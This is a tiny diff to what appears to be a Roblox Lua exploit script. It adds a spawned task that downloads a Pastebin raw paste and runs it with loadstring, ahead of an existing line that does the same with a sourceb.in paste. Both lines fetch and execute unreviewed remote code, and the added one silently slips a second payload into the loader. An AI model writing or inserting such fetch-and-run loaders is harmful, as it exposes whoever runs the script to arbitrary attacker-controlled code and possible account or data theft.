@@ -1,1 +1,5 @@
+task.spawn(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/99WeFkzV"))()
+end)
+task.wait(0.3)
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/nAUjh13mVP/0"))()
